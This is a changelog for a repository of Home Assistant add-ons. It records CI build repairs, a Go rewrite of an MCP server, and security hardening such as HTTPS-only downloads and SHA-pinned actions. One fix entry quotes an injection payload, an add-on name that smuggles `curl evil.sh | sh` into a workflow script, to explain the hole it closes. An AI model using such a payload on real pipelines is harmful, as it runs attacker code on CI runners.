# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

This file is not edited by hand. Every change writes its own fragment under
`.changes/unreleased/` with [chlog](https://github.com/luizjhonata/chlog), and a release compiles
the pending fragments into a version section here — so two branches each adding an entry no
longer touch the same lines, and a rebase that used to conflict on this file now conflicts on
nothing.

When a new release is proposed:

1. Create a new branch `bump/x.x.x` (this isn't a long-lived branch!!!);
2. The fragments pending under `.changes/unreleased/` are compiled into a version section by `chlog batch auto && chlog merge` (AutoBump does this for you — it reads the fragments directly);
3. Open a Pull Request with the bump version changes targeting the `main` branch;
4. When the Pull Request is merged, a new Git tag must be created using <LINK TO THE PLATFORM TO OPEN THE PULL REQUEST>.

Releases to productive environments should run from a tagged version.
Exceptions are acceptable depending on the circumstances (critical bug fixes that can be cherry-picked, etc.).

## [Unreleased]

## [0.3.1] - 2026-08-27

### Changed

- changed the Claude workflows to call the reusable workflows in `rios0rios0/pipelines` instead of `rios0rios0/.github`, which is where every other reusable workflow and composite action already lives, and renamed them to `claude-review.yaml` and `claude-mention.yaml`, matching the `reusable-claude-review.yaml` / `reusable-claude-mention.yaml` definitions they call

### Fixed

- restored the `.changes/unreleased/` directory with a `.gitkeep`, so the release tooling keeps recognising this project as [chlog](https://github.com/luizjhonata/chlog)-based after a release consumes the last fragment. Git tracks files rather than directories, so the bump commit that removed the final fragment removed the directory too, and the next run read the empty `[Unreleased]` section as "nothing to release"

### Removed

- removed the unused `id-token: write` permission from the Claude workflow callers, and changed `claude-review.yaml`'s display name to `Claude Review` so it matches its file name and its `Claude Mention` sibling. `anthropics/claude-code-action` needs `id-token: write` only for workload identity federation or the Bedrock / Vertex / Foundry OIDC paths; these authenticate with `claude_code_oauth_token`, so the scope allowed minting OIDC tokens for any audience without ever being used.

## [0.3.0] - 2026-08-26

### Added

- added a `Tests` workflow that builds, vets, `gofmt`-checks and runs `go test -tags unit -race` for `mcp-server-extended` on every push and pull request that touches it. The repository previously had no test job at all, which is how a change requiring `HA_URL` reached `main` while breaking all fifteen tests that patched only `HA_TOKEN` — the automated review caught it, not the pipeline.
- added a tailored `code-review` skill under `.github/skills/` so GitHub Copilot reviews changes against the [rios0rios0/guide](https://github.com/rios0rios0/guide/wiki) standards and this repository's own load-bearing invariants

### Changed

- changed the changelog to [chlog](https://github.com/luizjhonata/chlog) fragments: a change now writes its own YAML file under `.changes/unreleased/` through `chlog new --kind <Kind> --body "..."`, and `CHANGELOG.md` is GENERATED from them at release time by `chlog batch auto && chlog merge`. That is the one thing a single shared file cannot do — two branches each adding an entry no longer touch the same lines, so a rebase that used to conflict on `CHANGELOG.md` now conflicts on nothing. The `[Unreleased]` section was empty, so nothing had to be carried across. AutoBump already reads the fragments directly, so the release flow is unchanged.
- changed the Go module dependencies to their latest versions
- kept every add-on architecture buildable instead of narrowing `arch` lists when an upstream image lacks a manifest. `it-tools` and `grocy` copy only interpreted or static payloads — a built SPA and Grocy's PHP sources — so their upstream stages are now pinned with `FROM --platform=${BUILDPLATFORM}` and `armv7` builds again from the `amd64`/`arm64` manifests upstream does publish. `whisper-cpp` is now compiled from source (`v1.9.3`) against its own `${BUILD_FROM}` base, which restores `aarch64` and also fixes `amd64`: the upstream image is built on Ubuntu, so its glibc-linked binaries could never have run on the musl-based Home Assistant base, and the add-on's service script pointed at `/app/server`, a binary that image never contained (it is `whisper-server`).
- made `HA_URL` required in `mcp-server-extended` instead of defaulting to `http://homeassistant.local:8123`. The old default hardcoded an unencrypted endpoint and silently aimed requests — bearer token included — at a guessed host whenever the variable was unset. The add-on always exports it from `config.yaml`, so add-on users see no change; the nested `CHANGELOG.md` records the effect on direct users of the MCP server.
- moved `aarch64` image builds onto native `ubuntu-24.04-arm` runners and stopped registering QEMU when the target platform already matches the runner. Emulated `arm64` builds are roughly an order of magnitude slower, which now matters because `whisper-cpp` compiles from source, and every build log had been carrying a spurious `cannot register "/usr/bin/qemu-x86_64"` failure from asking QEMU to emulate the host's own architecture. `_build-addon.yaml` takes a `runner` input, selects `yq` for the runner's architecture, and fails with a clear message when an add-on's `build.yaml` declares no `build_from` entry for the architecture being built. The `yq` downloads now pass `wget --https-only`, so a redirect in the release download chain cannot downgrade the request to plain HTTP — flagged by the repository's own SAST scan.
- rewrote the `mcp-server-extended` add-on in Go. It was the only add-on shipping its own application code, and being a Python package was costing it: installing `pdm` on armv7 meant compiling `msgpack` from source under QEMU because no musl armv7 wheel exists, which took roughly twenty minutes per build, and the image carried a Python runtime plus a `cargo`/`gcc`/`musl-dev` toolchain purely to get there. The Go build cross-compiles from a `--platform=${BUILDPLATFORM}` builder stage in about nine seconds per architecture and ships a single ~8 MB static binary with no runtime at all. Behaviour is unchanged: the same eight tools over MCP stdio, the same JSON payloads, backed by the official `modelcontextprotocol/go-sdk`. The code follows the repository's Go conventions — domain/infrastructure split, Dig for wiring, Logrus to stderr, and testify suites tagged `//go:build unit` with in-memory doubles and builders under `test/domain/`.
- rewrote the `mcp-server-extended` documentation for the Go implementation. The eight files under `.docs/` still described the Python package — `pip install -r requirements.txt`, a `src/mcp_ha_extended/` tree, a `FROM python:3.11-slim` example image and a Cursor config pointing at `server.py` — none of which exist any more. Setup and quick-start now build and run the binary, the structure document shows the `cmd`/`internal`/`test` layout, and the two runnable examples in the usage guide (bulk enable and YAML import) are Go programs against the same repository the add-on uses. The tool-call illustrations were retagged from `python` to `text`, because they were never Python — they are MCP calls and their JSON responses.

### Fixed

- repaired the `Build and Push Docker Images` workflow, which had failed on every commit to `main` since 2026-04-17 and, because the manifest job waits on the whole build matrix, had also stopped publishing the add-ons that were building fine. Nine add-ons were broken for six distinct reasons: `linkwarden` copied `/data/app`, a path upstream no longer has (the application sits directly under `/data`); `localai` copied `/build/local-ai`, a path that only exists inside upstream's builder stage rather than the published image (`/local-ai`); `openclaw` installed the glibc-linked Node.js tarball from `nodejs.org` onto the musl-based Home Assistant base, so `node` could not execute on either architecture, and now installs Alpine's `nodejs` and `npm` packages plus a temporary `build-base`/`python3` toolchain, because its native dependencies (`tree-sitter-bash` among them) publish no prebuilt musl `aarch64` binaries and have to be compiled by `node-gyp` during the install; `n8n` pulled through `docker.n8n.io`, which answered `429 Too Many Requests` to anonymous CI pulls, and now pulls the same image from Docker Hub; `opencode` pointed at the non-existent release `v0.1.0` with a stale asset-name pattern, and now uses `0.0.55` with the current `opencode-linux-<arch>.tar.gz` naming; and `whisper-cpp`, `it-tools` and `grocy` each failed to resolve an upstream manifest for one of their declared architectures.
- stopped a single failing add-on from blocking publication of all the others. The `manifest` job depended on `build`, which is one matrix job across every add-on and architecture, so one broken architecture marked the whole job failed and skipped publishing for all 19 add-ons — no version or `latest` tag had been pushed since 2026-04-17, including for add-ons that were building perfectly. `manifest` now runs regardless of the build matrix's aggregate result and gates per add-on instead: it publishes only when every architecture that add-on's `config.yaml` declares produced a digest, and otherwise skips with a warning naming the missing architectures and leaves the existing tags untouched. A partial set is never published, because overwriting `latest` with a manifest that silently lost an architecture is worse than not publishing at all. The manifest is now also assembled from the declared architecture list rather than from whatever digest files are on disk.

### Removed

- removed `armv7` from `ollama-container`. Ollama is 64-bit only: upstream publishes neither an `armv7` image manifest nor a 32-bit ARM release archive, so there is nothing to copy or compile. This is the one architecture in this change that could not be preserved, and the reason is now recorded next to the `arch` list and in the add-on's `README.md`.
- removed a shell injection in the `Build and Push Docker Images` workflow. `inputs.addon`, supplied by whoever triggers a `workflow_dispatch`, was interpolated straight into the `detect-changes` script, so an add-on name such as `x"; curl evil.sh | sh; #` ran as code on the runner. Every context value that step reads is now passed through `env:` and dereferenced as a shell variable, where it can only ever be data.

### Security

- enforced HTTPS on every artifact download. All 115 `curl` invocations across the 19 add-on `Dockerfile`s and the three `yq` downloads in the workflows now pass `--proto '=https' --proto-redir '=https'`, so neither the initial request nor any redirect hop can be steered onto plain HTTP. The workflow downloads previously used `wget --https-only`, which blocks the downgrade in practice but is not what the scanner recognises; they are now `curl` for consistency with the `Dockerfile`s and to clear the rule.
- hardened the `mcp-server-extended` image build. `pdm` is pinned to `2.28.2` and installed with `--only-binary :all:`, so the build neither drifts to whatever version is newest at build time nor executes a source distribution's `setup.py` — with a single scoped exception for `msgpack`, which publishes no musllinux `armv7` wheel and would otherwise make the `armv7` build unresolvable; and `COPY pyproject.toml pdm.lock* ./` no longer uses a glob, which is how unintended files reach an image.
- narrowed the secrets handed to the Claude reusable workflows. `claude.yaml` and `claude-code-review.yaml` passed `secrets: inherit`, giving workflows in another repository every secret this one holds; they now pass only `CLAUDE_CODE_OAUTH_TOKEN`, the single secret those workflows declare as required.
- pinned every GitHub Actions dependency to a full commit SHA — seven third-party actions and the three reusable workflows this repository calls — so a compromised or repointed tag cannot change what runs in CI. Each pin carries the human-readable version in a trailing comment, and a new `.github/dependabot.yaml` schedules weekly `github-actions` updates, because a pin nothing advances is just a stale dependency.

## [0.2.2] - 2026-05-19

### Changed

- refreshed `CLAUDE.md` and `.github/copilot-instructions.md` to document the `release.yaml` workflow

## [0.2.1] - 2026-04-28

### Changed

- refreshed `CLAUDE.md` and `.github/copilot-instructions.md` to document the `claude.yaml` and `claude-code-review.yaml` workflows

## [0.2.0] - 2026-04-17

### Added

- added `n8n/workflows/gg-incident.json` and companion `README.md` -- importable n8n workflow that receives GitGuardian webhook incidents and forwards them to Telegram via a bot

## [0.1.0] - 2026-03-24

The changes weren't tracked until this version.
